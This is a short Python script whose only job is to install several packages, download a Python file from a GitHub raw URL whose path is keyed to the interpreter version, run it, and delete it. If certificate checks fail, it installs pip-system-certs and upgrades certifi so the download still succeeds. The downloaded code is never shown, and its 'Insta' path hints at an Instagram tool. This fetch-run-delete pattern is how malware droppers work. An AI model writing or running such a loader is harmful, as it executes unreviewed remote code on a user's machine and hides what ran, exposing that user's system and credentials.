import sys
import urllib.request
import subprocess
import importlib
import tempfile
import os

packages = {
    "requests": "requests",
    "httpx": "httpx",
    "cfonts": "python-cfonts",
    "user_agent": "user-agent",
    "pytz": "pytz",
    "rich": "rich",
}
for module, pkg in packages.items():
    try:
        importlib.import_module(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

py_ver = f"{sys.version_info.major}.{sys.version_info.minor}"
url = f"https://raw.githubusercontent.com/stein-exe/Files/refs/heads/main/Insta/{py_ver}.py"

tmp = tempfile.NamedTemporaryFile(suffix=".py", delete=False)
try:
    try:
        urllib.request.urlretrieve(url, tmp.name)
    except urllib.error.URLError as e:
        if "CERTIFICATE_VERIFY_FAILED" in str(e):
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "certifi"])
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pip-system-certs"])
            urllib.request.urlretrieve(url, tmp.name)
        else:
            raise
    tmp.close()
    subprocess.run([sys.executable, tmp.name], check=True)
finally:
    os.unlink(tmp.name)